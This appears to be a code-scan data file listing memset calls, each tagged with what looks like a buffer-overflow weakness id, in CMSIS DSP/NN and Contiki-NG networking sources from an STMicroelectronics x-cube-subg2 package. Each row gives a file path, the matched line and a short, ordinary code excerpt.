2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_decimate_init_q31.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_decimate_init_q31.c,"memset(pState, 0, (numTaps + (blockSize - 1)) * sizeof(q31_t));",120,1,"
    /* Clear the state buffer.  The size is always (blockSize + numTaps - 1) */
    memset(pState, 0, (numTaps + (blockSize - 1)) * sizeof(q31_t));

    /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_init_q15.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_init_q15.c,"memset(pState, 0, (numTaps + (blockSize)) * sizeof(q15_t));",120,1,"
    /* Clear the state buffer.  The size is always (blockSize + numTaps ) */
    memset(pState, 0, (numTaps + (blockSize)) * sizeof(q15_t));

    /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_init_q31.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_init_q31.c,"memset(pState, 0, (blockSize + ((uint32_t) numTaps - 1U)) * sizeof(q31_t));",120,1,"
  /* Clear state buffer and state array size is (blockSize + numTaps - 1) */
  memset(pState, 0, (blockSize + ((uint32_t) numTaps - 1U)) * sizeof(q31_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_init_q7.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_init_q7.c,"memset(pState, 0, (numTaps + (blockSize - 1U)) * sizeof(q7_t));",120,1,"
  /* Clear the state buffer.  The size is always (blockSize + numTaps - 1) */
  memset(pState, 0, (numTaps + (blockSize - 1U)) * sizeof(q7_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_lattice_init_f32.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_lattice_init_f32.c,"memset(pState, 0, (numStages) * sizeof(float32_t));",120,1,"
  /* Clear state buffer and size is always numStages */
  memset(pState, 0, (numStages) * sizeof(float32_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_lattice_init_q15.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_lattice_init_q15.c,"memset(pState, 0, (numStages) * sizeof(q15_t));",120,1,"
  /* Clear state buffer and size is always numStages */
  memset(pState, 0, (numStages) * sizeof(q15_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_lattice_init_q31.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_lattice_init_q31.c,"memset(pState, 0, (numStages) * sizeof(q31_t));",120,1,"
  /* Clear state buffer and size is always numStages */
  memset(pState, 0, (numStages) * sizeof(q31_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_sparse_init_f32.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_sparse_init_f32.c,"memset(pState, 0, (maxDelay + blockSize) * sizeof(float32_t));",120,1,"
  /* Clear state buffer and size is always maxDelay + blockSize */
  memset(pState, 0, (maxDelay + blockSize) * sizeof(float32_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_sparse_init_q15.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_sparse_init_q15.c,"memset(pState, 0, (maxDelay + blockSize) * sizeof(q15_t));",120,1,"
  /* Clear state buffer and size is always maxDelay + blockSize */
  memset(pState, 0, (maxDelay + blockSize) * sizeof(q15_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_sparse_init_q31.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_sparse_init_q31.c,"memset(pState, 0, (maxDelay + blockSize) * sizeof(q31_t));",120,1,"
  /* Clear state buffer and size is always maxDelay + blockSize */
  memset(pState, 0, (maxDelay + blockSize) * sizeof(q31_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_sparse_init_q7.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_fir_sparse_init_q7.c,"memset(pState, 0, (maxDelay + blockSize) * sizeof(q7_t));",120,1,"
  /* Clear state buffer and size is always maxDelay + blockSize */
  memset(pState, 0, (maxDelay + blockSize) * sizeof(q7_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_iir_lattice_init_f32.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_iir_lattice_init_f32.c,"memset(pState, 0, (numStages + blockSize) * sizeof(float32_t));",120,1,"
  /* Clear state buffer and size is always blockSize + numStages */
  memset(pState, 0, (numStages + blockSize) * sizeof(float32_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_iir_lattice_init_q15.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_iir_lattice_init_q15.c,"memset(pState, 0, (numStages + blockSize) * sizeof(q15_t));",120,1,"
  /* Clear state buffer and size is always blockSize + numStages */
  memset(pState, 0, (numStages + blockSize) * sizeof(q15_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_iir_lattice_init_q31.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_iir_lattice_init_q31.c,"memset(pState, 0, (numStages + blockSize) * sizeof(q31_t));",120,1,"
  /* Clear state buffer and size is always blockSize + numStages */
  memset(pState, 0, (numStages + blockSize) * sizeof(q31_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_lms_init_f32.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_lms_init_f32.c,"memset(pState, 0, (numTaps + (blockSize - 1)) * sizeof(float32_t));",120,1,"
  /* Clear state buffer and size is always blockSize + numTaps */
  memset(pState, 0, (numTaps + (blockSize - 1)) * sizeof(float32_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_lms_init_q31.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_lms_init_q31.c,"memset(pState, 0, ((uint32_t) numTaps + (blockSize - 1U)) * sizeof(q31_t));",120,1,"
  /* Clear state buffer and size is always blockSize + numTaps - 1 */
  memset(pState, 0, ((uint32_t) numTaps + (blockSize - 1U)) * sizeof(q31_t));

  /* Assign state pointer */
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_lms_norm_init_q31.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\Source\FilteringFunctions\arm_lms_norm_init_q31.c,"memset(pState, 0, (numTaps + (blockSize - 1U)) * sizeof(q31_t));",120,1,"
  /* Clear state buffer and size is always blockSize + numTaps - 1  */
  memset(pState, 0, (numTaps + (blockSize - 1U)) * sizeof(q31_t));

  /* Assign post Shift value applied to coefficients */
"
2021\x-cube-subg2\Drivers\CMSIS\NN\Source\ConvolutionFunctions\arm_convolve_HWC_q15_basic.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\NN\Source\ConvolutionFunctions\arm_convolve_HWC_q15_basic.c,"memset(pBuffer, 0, sizeof(q15_t)*ch_im_in);",120,1,"                        /* Filling 0 for out-of-bound paddings */
                        /* arm_fill_q15(0, pBuffer, ch_im_in); */
                        memset(pBuffer, 0, sizeof(q15_t)*ch_im_in);
                    } else
                    {
"
2021\x-cube-subg2\Drivers\CMSIS\NN\Source\ConvolutionFunctions\arm_depthwise_separable_conv_HWC_q7.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\NN\Source\ConvolutionFunctions\arm_depthwise_separable_conv_HWC_q7.c,"memset(pBuffer, 0, ch_im_in);",120,1,"                    {
                        /* arm_fill_q7(0, pBuffer, ch_im_in); */
                        memset(pBuffer, 0, ch_im_in);
                    } else
                    {
"
2021\x-cube-subg2\Drivers\CMSIS\RTOS2\Template\cmsis_os1.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\RTOS2\Template\cmsis_os1.c,"memset(block, 0, block_size);",120,1,"  block = osMemoryPoolAlloc((osMemoryPoolId_t)pool_id, 0U);
  if (block != NULL) {
    memset(block, 0, block_size);
  }
  return block;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\lib\heapmem.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\lib\heapmem.c,"memset(stats, 0, sizeof(*stats));",120,1,"  chunk_t *chunk;

  memset(stats, 0, sizeof(*stats));

  for(chunk = first_chunk;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\lib\memb.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\lib\memb.c,"memset(m->used, 0, m->num);",120,1,"memb_init(struct memb *m)
{
  memset(m->used, 0, m->num);
  memset(m->mem, 0, m->size * m->num);
}
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\lib\memb.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\lib\memb.c,"memset(m->mem, 0, m->size * m->num);",120,1,"{
  memset(m->used, 0, m->num);
  memset(m->mem, 0, m->size * m->num);
}
/*---------------------------------------------------------------------------*/
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\link-stats.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\link-stats.c,"memset(&stats->cnt_current, 0, sizeof(stats->cnt_current));",120,1,"    stats->cnt_total.num_packets_acked += stats->cnt_current.num_packets_acked;
    stats->cnt_total.num_packets_rx += stats->cnt_current.num_packets_rx;
    memset(&stats->cnt_current, 0, sizeof(stats->cnt_current));
  }
}
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\nbr-table.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\nbr-table.c,"memset(item, 0, table->item_size);",120,1,"
  /* Initialize item data and set ""used"" bit */
  memset(item, 0, table->item_size);
  nbr_set_bit(used_map, table, item, 1);

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\packetbuf.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\packetbuf.c,"memset(packetbuf_attrs, 0, sizeof(packetbuf_attrs));",120,1,"{
  int i;
  memset(packetbuf_attrs, 0, sizeof(packetbuf_attrs));
  for(i = 0; i < PACKETBUF_NUM_ADDRS; ++i) {
    linkaddr_copy(&packetbuf_addrs[i].addr, &linkaddr_null);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\coap\coap-uip.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\coap\coap-uip.c,"memset(&ks, 0, sizeof(ks));",120,1,"  }

  memset(&ks, 0, sizeof(ks));
  LOG_DBG(""---===>>> Getting the Key or ID <<<===---\n"");
  switch(type) {
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\coap\coap.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\coap\coap.c,"memset(coap_pkt, 0, sizeof(coap_message_t));",120,1,"{
  /* Important thing */
  memset(coap_pkt, 0, sizeof(coap_message_t));

  coap_pkt->type = type;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\coap\coap.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\coap\coap.c,"memset(coap_pkt->options, 0, sizeof(coap_pkt->options));",120,1,"
  /* parse options */
  memset(coap_pkt->options, 0, sizeof(coap_pkt->options));
  current_option += coap_pkt->token_len;

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\coap\tinydtls-support\dtls-support.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\coap\tinydtls-support\dtls-support.c,"memset(sess, 0, sizeof(session_t));",120,1,"dtls_session_init(session_t *sess)
{
  memset(sess, 0, sizeof(session_t));
}
/*---------------------------------------------------------------------------*/
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\http-socket.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\http-socket.c,"memset(&s->header, -1, sizeof(s->header));",120,1,"  PT_BEGIN(&s->headerpt);

  memset(&s->header, -1, sizeof(s->header));

  /* Skip the HTTP response */
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\websocket.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\websocket.c,"memset(s->mask, 0, sizeof(s->mask));",120,1,"      /* The s->mask field holds the bitmask of the data chunk, if
       * any. */
      memset(s->mask, 0, sizeof(s->mask));

      /* We first read out the length of the application data
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\mqtt\mqtt-prop.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\mqtt\mqtt-prop.c,"memset(data, 0, 4);",120,1,"
  /* All integer input properties will be returned as uint32_t */
  memset(data, 0, 4);

  data_out = (uint32_t *)data;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\mqtt\mqtt.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\mqtt\mqtt.c,"memset(&conn->out_packet, 0, sizeof(conn->out_packet));",120,1,"
  /* Reset outgoing packet */
  memset(&conn->out_packet, 0, sizeof(conn->out_packet));

  tcp_socket_close(&conn->socket);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\mqtt\mqtt.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\mqtt\mqtt.c,"memset(&conn->socket, 0, sizeof(conn->socket));",120,1,"  tcp_socket_unregister(&conn->socket);

  memset(&conn->socket, 0, sizeof(conn->socket));

  conn->state = MQTT_CONN_STATE_NOT_CONNECTED;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\mqtt\mqtt.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\mqtt\mqtt.c,"memset(packet, 0, sizeof(struct mqtt_in_packet));",120,1,"reset_packet(struct mqtt_in_packet *packet)
{
  memset(packet, 0, sizeof(struct mqtt_in_packet));
}
/*---------------------------------------------------------------------------*/
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\mqtt\mqtt.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\mqtt\mqtt.c,"memset(conn, 0, sizeof(struct mqtt_connection));",120,1,"
  /* Set defaults - Set all to zero to begin with */
  memset(conn, 0, sizeof(struct mqtt_connection));
#if MQTT_5
  /* Server capabilities have non-zero defaults */
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\snmp\snmp-engine.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\snmp\snmp-engine.c,"memset(&header, 0, sizeof(header));",120,1,"  snmp_varbind_t varbinds[SNMP_MAX_NR_VALUES];

  memset(&header, 0, sizeof(header));
  memset(varbinds, 0, sizeof(varbinds));

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\snmp\snmp-engine.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\snmp\snmp-engine.c,"memset(varbinds, 0, sizeof(varbinds));",120,1,"
  memset(&header, 0, sizeof(header));
  memset(varbinds, 0, sizeof(varbinds));

  if(!snmp_message_decode(snmp_packet, &header, varbinds)) {
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\sicslowpan.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\sicslowpan.c,"memset(&ipaddr->u8[prefcount], 0, 16 - (prefcount + postcount));",120,1,"  }
  if(prefcount + postcount < 16) {
    memset(&ipaddr->u8[prefcount], 0, 16 - (prefcount + postcount));
  }
  if(postcount > 0) {
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\tcpip.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\tcpip.c,"memset(s.listenports, 0, UIP_LISTENPORTS*sizeof(*(s.listenports)));",120,1,"
#if UIP_TCP
  memset(s.listenports, 0, UIP_LISTENPORTS*sizeof(*(s.listenports)));
  s.p = PROCESS_CURRENT();
#endif
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uip-ds6-route.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uip-ds6-route.c,"memset(&r->state, 0, sizeof(UIP_DS6_ROUTE_STATE_TYPE));",120,1,"
#ifdef UIP_DS6_ROUTE_STATE_TYPE
  memset(&r->state, 0, sizeof(UIP_DS6_ROUTE_STATE_TYPE));
#endif

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uip-ds6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uip-ds6.c,"memset(uip_ds6_prefix_list, 0, sizeof(uip_ds6_prefix_list));",120,1,"  LOG_INFO(""%u anycast addresses\n"", UIP_DS6_AADDR_NB);

  memset(uip_ds6_prefix_list, 0, sizeof(uip_ds6_prefix_list));
  memset(&uip_ds6_if, 0, sizeof(uip_ds6_if));
  uip_ds6_addr_size = sizeof(struct uip_ds6_addr);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uip-ds6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uip-ds6.c,"memset(&uip_ds6_if, 0, sizeof(uip_ds6_if));",120,1,"
  memset(uip_ds6_prefix_list, 0, sizeof(uip_ds6_prefix_list));
  memset(&uip_ds6_if, 0, sizeof(uip_ds6_if));
  uip_ds6_addr_size = sizeof(struct uip_ds6_addr);
  uip_ds6_netif_addr_list_offset = offsetof(struct uip_ds6_netif, addr_list);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uip6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uip6.c,"memset(&conn->ripaddr, 0, sizeof(uip_ipaddr_t));",120,1,"  conn->rport = rport;
  if(ripaddr == NULL) {
    memset(&conn->ripaddr, 0, sizeof(uip_ipaddr_t));
  } else {
    uip_ipaddr_copy(&conn->ripaddr, ripaddr);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uip6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uip6.c,"memset(uip_reassbitmap, 0, sizeof(uip_reassbitmap));",120,1,"    uip_id = frag_buf->id;
    /* Clear the bitmap. */
    memset(uip_reassbitmap, 0, sizeof(uip_reassbitmap));
  }
  /*
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uipbuf.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uipbuf.c,"memset(uipbuf_default_attrs, 0, sizeof(uipbuf_default_attrs));",120,1,"uipbuf_init(void)
{
  memset(uipbuf_default_attrs, 0, sizeof(uipbuf_default_attrs));
  /* And initialize anything that should be initialized */
  uipbuf_set_default_attr(UIPBUF_ATTR_MAX_MAC_TRANSMISSIONS,
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uiplib.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\uiplib.c,"memset(&ipaddr->u8[zero], 0, sizeof(uip_ip6addr_t) - len);",120,1,"    memmove(&ipaddr->u8[zero + sizeof(uip_ip6addr_t) - len],
            &ipaddr->u8[zero], len - zero);
    memset(&ipaddr->u8[zero], 0, sizeof(uip_ip6addr_t) - len);
  }

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\esmrf.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\esmrf.c,"#define ESMRF_STATS_INIT() do { memset(&stats, 0, sizeof(stats)); } while(0)",120,1,"
#define ESMRF_STATS_ADD(x) stats.x++
#define ESMRF_STATS_INIT() do { memset(&stats, 0, sizeof(stats)); } while(0)
#else /* UIP_MCAST6_STATS */
#define ESMRF_STATS_ADD(x)
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,"#define seed_id_clr(a) (memset((a), 0, sizeof(seed_id_t)))",120,1," * a: Value to clear
 */
#define seed_id_clr(a) (memset((a), 0, sizeof(seed_id_t)))
/*---------------------------------------------------------------------------*/
/* Buffered message set
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,"#define DOMAIN_SET_CLEAR_USED(h) (memset(&(h)->data_addr, 0, sizeof(uip_ip6addr_t)))",120,1," * h: pointer to the message set entry
 */
#define DOMAIN_SET_CLEAR_USED(h) (memset(&(h)->data_addr, 0, sizeof(uip_ip6addr_t)))
/*---------------------------------------------------------------------------*/
/**
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,"#define MPL_STATS_INIT() do { memset(&stats, 0, sizeof(stats)); } while(0)",120,1,"
#define MPL_STATS_ADD(x) stats.x++
#define MPL_STATS_INIT() do { memset(&stats, 0, sizeof(stats)); } while(0)
#else /* UIP_MCAST6_STATS */
#define MPL_STATS_ADD(x)
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,"memset(locmmptr, 0, sizeof(struct mpl_msg));",120,1,"  for(locmmptr = &buffered_message_set[MPL_BUFFERED_MESSAGE_SET_SIZE - 1]; locmmptr >= buffered_message_set; locmmptr--) {
    if(!MSG_SET_IS_USED(locmmptr)) {
      memset(locmmptr, 0, sizeof(struct mpl_msg));
      return locmmptr;
    }
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,"memset(reclaim, 0, sizeof(struct mpl_msg));",120,1,"    trickle_timer_stop(&reclaim->tt);
    mpl_trickle_timer_reset(reclaim->seed->domain);
    memset(reclaim, 0, sizeof(struct mpl_msg));
  }
  return reclaim;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,"memset(locdsptr, 0, sizeof(struct mpl_domain));",120,1,"        return NULL;
      }
      memset(locdsptr, 0, sizeof(struct mpl_domain));
      memcpy(&locdsptr->data_addr, &data_addr, sizeof(uip_ip6addr_t));
      memcpy(&locdsptr->ctrl_addr, &ctrl_addr, sizeof(uip_ip6addr_t));
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,"memset(vector, 0, sizeof(vector));",120,1,"
      /* Populate the seed info message vector */
      memset(vector, 0, sizeof(vector));
      vec_len = 0;
      cur_seq = 0;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,"memset(locssptr, 0, sizeof(struct mpl_seed));",120,1,"      return UIP_MCAST6_DROP;
    }
    memset(locssptr, 0, sizeof(struct mpl_seed));
    LIST_STRUCT_INIT(locssptr, min_seq);
    seed_id_cpy(&locssptr->seed_id, &seed_id);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,"memset(UIP_EXT_BUF, 0, HBHO_TOTAL_LEN);",120,1,"  /* Slide 'right' by HBHO_TOTAL_LEN bytes */
  memmove(UIP_EXT_BUF_NEXT, UIP_EXT_BUF, uip_len - UIP_IPH_LEN);
  memset(UIP_EXT_BUF, 0, HBHO_TOTAL_LEN);

  /* Insert the option header into the packet and set it's length */
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,"memset(domain_set, 0, sizeof(struct mpl_domain) * MPL_DOMAIN_SET_SIZE);",120,1,"
  /* Clear out all sets */
  memset(domain_set, 0, sizeof(struct mpl_domain) * MPL_DOMAIN_SET_SIZE);
  memset(seed_set, 0, sizeof(struct mpl_seed) * MPL_SEED_SET_SIZE);
  memset(buffered_message_set, 0, sizeof(struct mpl_msg) * MPL_BUFFERED_MESSAGE_SET_SIZE);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,"memset(seed_set, 0, sizeof(struct mpl_seed) * MPL_SEED_SET_SIZE);",120,1,"  /* Clear out all sets */
  memset(domain_set, 0, sizeof(struct mpl_domain) * MPL_DOMAIN_SET_SIZE);
  memset(seed_set, 0, sizeof(struct mpl_seed) * MPL_SEED_SET_SIZE);
  memset(buffered_message_set, 0, sizeof(struct mpl_msg) * MPL_BUFFERED_MESSAGE_SET_SIZE);

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\mpl.c,"memset(buffered_message_set, 0, sizeof(struct mpl_msg) * MPL_BUFFERED_MESSAGE_SET_SIZE);",120,1,"  memset(domain_set, 0, sizeof(struct mpl_domain) * MPL_DOMAIN_SET_SIZE);
  memset(seed_set, 0, sizeof(struct mpl_seed) * MPL_SEED_SET_SIZE);
  memset(buffered_message_set, 0, sizeof(struct mpl_msg) * MPL_BUFFERED_MESSAGE_SET_SIZE);

  /* Register the ICMPv6 input handler */
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\roll-tm.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\ipv6\multicast\roll-tm.c,"#define ROLL_TM_STATS_INIT() do { memset(&stats, 0, sizeof(stats)); } while(0)",120,1,"
#define ROLL_TM_STATS_ADD(x) stats.x++
